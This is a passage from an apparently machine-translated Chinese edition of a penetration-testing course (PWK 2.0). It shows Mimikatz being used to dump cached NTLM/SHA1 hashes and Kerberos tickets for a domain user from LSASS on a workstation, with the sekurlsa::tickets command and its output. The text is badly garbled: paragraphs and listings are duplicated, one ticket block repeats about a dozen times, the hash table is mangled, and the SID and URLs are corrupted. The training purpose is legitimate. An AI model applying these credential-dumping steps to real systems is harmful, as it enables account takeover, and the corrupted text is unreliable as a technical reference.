
# msv.

主 * 用户名 : Offsec

(Benjamin Delphy, 2018), https://github.com/gentilikwi/mimikatz

(Matt Graeber, 2016), https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-PEInjection.ps1

(Ruben Boon, 2016), https://www.fuzzysecurity.com/tutorials/18.html

(Benjamin Delphy, 2014), https://github.com/gentilikwi/mimikatz/wiki/module--sekurisa

(Microsoft, 2015), https://ms.microsoft.com/en-us/library/windows/desktop/bb530716(v=vs.85).aspx

(Mimikatz, 2019), https://github.com/gentilikwi/mimikatz/wiki/module--sekurisa

PWK 2.0 © Offensive Security Ltd. 版留所有. 648

对于 Windows 7 等较旧操作系统，或手动设置了 WDigest 的操作系统，该功能将被启用。当 WDigest 启用时，运行 Mimikatz 将在密码哈希值旁边显示明文密码。

有了这些哈希值，我们可以尝试破解它们并获取明文密码。

使用 Kali Linux 2.0 进行渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_763_0.png)

| 域 | NTLM | SHA1 | DPAPI |
| :--- | :--- | :--- | :--- |
| tspkg: | | | |
| wdigest: | | | |
| \ 用户 | | | |
| \ 域 | | | |
| \ 密码 | | | |
| kerberos: | | | |
| \ 用户 | | | |
| \ 域 | | | |
| \ 密码 | | | |
| CORP | | | |
| : e2b475c1da2a0748290d07aa966c327 | | | |
| : 8c7ff430e4ab0abc1e103d764011c74600d26e | | | |
| : 162d3133b93a2e72a030ec9210f0 | | | |
| : Offsec | | | |
| : CORP | | | |
| : {null} | | | |
| : Offsec | | | |
| : CORP.COM | | | |
| : (null) | | | |

列表 689 - 在域工作站上执行 mimikatz

输出片段显示了存储在 `LSASS` 中的、属于域用户 Offsec 的所有凭据信息，包括缓存哈希值。

注意，我们在上面的输出中高亮了两种类型的哈希值。这取决于 AD 实现的功能层级别。例如，对于功能层级别为 Windows 2003 的实例，`NTLM` 是唯一可用的哈希算法。对于运行 Windows Server 2008 或更高版本的实例，`NTLM` 和 `SHA-1`（`AES` 加密的常用伴侣）都可能可用。在

使用 Mimikatz 的另一种方法和用途是通过滥用 TGT 和服务票据来利用 Kerberos TGT 认证。正如已经讨论过的，我们知道当前登录到本地机器的用户 Kerberos TGT 和服务票据会被存储以便使用。这些票据也存储在 `LSASS` 中，我们使用 Mimikatz 来交互并检索我们自己的票据和其他用户的票据。

例如，在列表 690 中，我们使用 Mimikatz 显示存储在内存中的 Offsec 票据：

```
mimikatz > sekurlsa::tickets

认证 ID 会话

用户名

域

登录服务器

登录时间

SID

: 0 : 291668 (00000000:00047354) : Interactive with 1

: Offsec

: CORP

: DC01

: 08/02/2018 14.23.26

: 1-S-5-21-602875587-2787523311-2594796688-1103

* 用户名 : Offsec * 域 : CORP.COM * 密码 : (null)
```

> 654 (Microsoft, 2003). https://techn.microsoft.com/en-us/library/cc78886(v=ws10).aspx

PWK 2.0 版留所有 © Offensive Security Ltd. 版留所有. 649

使用 Kali Linux 2.0 进行渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_764_0.png)

## 组 0 - 票据授予服务 [0000000]

开始/结束/续期: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47

服务名称 (02) 目标名称 (02) 客户端名称 (01) 标志 405a0000 会话

```
: cifs: dc01 @ CORP.COM
: cifs: dc01 @ CORP.COM
: Offsec: @CORP.COM
: name:canonicalize; ok_delegate
0:69a70918
```

## 组 1 - 票据授予 [0000000]

开始/结束/续期: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47

服务名称 (02) 目标名称 (02) 客户端名称 (01) 标志 405a0000 会话

```
: cifs: dc01 @ CORP.COM
: cifs: dc01 @ CORP.COM
: Offsec: @CORP.COM
: name:canonicalize; ok_delegate
0:69a70918
```

## 组 2 - 票据授予服务 [0000000]

开始/结束/续期: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47

服务名称 (02) 目标名称 (02) 客户端名称 (01) 标志 405a0000 会话

```
: cifs: dc01 @ CORP.COM
: cifs: dc01 @ CORP.COM
: Offsec: @CORP.COM
: name:canonicalize; ok_delegate
0:69a70918
```

## 组 3 - 票据授予服务 [0000000]

开始/结束/续期: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47

服务名称 (02) 目标名称 (02) 客户端名称 (01) 标志 405a0000 会话

```
: cifs: dc01 @ CORP.COM
: cifs: dc01 @ CORP.COM
: Offsec: @CORP.COM
: name:canonicalize; ok_delegate
0:69a70918
```

## 组 4 - 票据授予服务 [0000000]

开始/结束/续期: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47

服务名称 (02) 目标名称 (02) 客户端名称 (01) 标志 405a0000 会话

```
: cifs: dc01 @ CORP.COM
: cifs: dc01 @ CORP.COM
: Offsec: @CORP.COM
: name:canonicalize; ok_delegate
0:69a70918
```

## 组 5 - 票据授予服务 [0000000]

开始/结束/续期: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47

服务名称 (02) 目标名称 (02) 客户端名称 (01) 标志 405a0000 会话

```
: cifs: dc01 @ CORP.COM
: cifs: dc01 @ CORP.COM
: Offsec: @CORP.COM
: name:canonicalize; ok_delegate
0:69a70918
```

## 组 6 - 票据授予服务 [0000000]

开始/结束/续期: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47

服务名称 (02) 目标名称 (02) 客户端名称 (01) 标志 405a0000 会话

```
: cifs: dc01 @ CORP.COM
: cifs: dc01 @ CORP.COM
: Offsec: @CORP.COM
: name:canonicalize; ok_delegate
0:69a70918
```

## 组 7 - 票据授予服务 [0000000]

开始/结束/续期: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47

服务名称 (02) 目标名称 (02) 客户端名称 (01) 标志 405a0000 会话

```
: cifs: dc01 @ CORP.COM
: cifs: dc01 @ CORP.COM
: Offsec: @CORP.COM
: name:canonicalize; ok_delegate
0:69a70918
```

## 组 8 - 票据授予服务 [0000000]

开始/结束/续期: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47

服务名称 (02) 目标名称 (02) 客户端名称 (01) 标志 405a0000 会话

```
: cifs: dc01 @ CORP.COM
: cifs: dc01 @ CORP.COM
: Offsec: @CORP.COM
: name:canonicalize; ok_delegate
0:69a70918
```

## 组 9 - 票据授予服务 [0000000]

开始/结束/续期: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47

服务名称 (02) 目标名称 (02) 客户端名称 (01) 标志 405a0000 会话

```
: cifs: dc01 @ CORP.COM
: cifs: dc01 @ CORP.COM
: Offsec: @CORP.COM
: name:canonicalize; ok_delegate
0:69a70918
```

## 组 10 - 票据授予服务 [0000000]

开始/结束/续期: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47

服务名称 (02) 目标名称 (02) 客户端名称 (01) 标志 405a0000 会话

```
: cifs: dc01 @ CORP.COM
: cifs: dc01 @ CORP.COM
: Offsec: @CORP.COM
: name:canonicalize; ok_delegate
0:69a70918
```

(此处截断了重复的输出，遵循逻辑进行翻译)

列表 689 - 在域工作站上执行 mimikatz

输出片段显示了存储在 `LSASS` 中的、属于域用户 Offsec 的所有凭据信息，包括缓存哈希值。

注意，我们在上面的输出中高亮了两种类型的哈希值。这取决于 AD 实现的功能层级别。例如，对于功能层级别为 Windows 2003 的实例，`NTLM` 是唯一可用的哈希算法。对于运行 Windows Server 2008 或更高版本的实例，`NTLM` 和 `SHA-1`（`AES` 加密的常用伴侣）都可能可用。在

使用 Mimikatz 的另一种方法和用途是通过滥用 TGT 和服务票据来利用 Kerberos TGT 认证。正如已经讨论过的，我们知道当前登录到本地机器的用户 Kerberos TGT 和服务票据会被存储以便使用。这些票据也存储在 `LSASS` 中，我们使用 Mimikatz 来交互并检索我们自己的票据和其他用户的票据。

例如，在列表 690 中，我们使用 Mimikatz 显示存储在内存中的 Offsec 票据：

```
mimikatz > sekurlsa::tickets

认证 ID 会话

用户名

域

登录服务器

登录时间

SID

: 0 : 291668 (00000000:00047354) : Interactive with 1

: Offsec

: CORP

: DC01

: 08/02/2018 14.23.26

: 1-S-5-21-602875587-2787523311-2594796688-1103

* 用户名 : Offsec * 域 : CORP.COM * 密码 : (null)
```

> 654 (Microsoft, 2003). https://techn.microsoft.com/en-us/library/cc78886(v=ws10).aspx

PWK 2.0 版留所有 © Offensive Security Ltd. 版留所有. 649

使用 Kali Linux 2.0 进行渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_764_0.png)

## 组 0 - 票据授予服务 [0000000]

开始/结束/续期: 09/02/2018 14.41.47 ; 10/02/2018 00.41.47 ; 16/02/2018 14.41.47

服务名称 (02) 目标名称 (02) 客户端名称 (01) 标志 405a0000 会话

```
: cifs: dc01 @ CORP.COM
: cifs: dc01 @ CORP.COM
: Offsec: @CORP.COM
: name:canonicalize; ok_delegate
0:69a70918
```
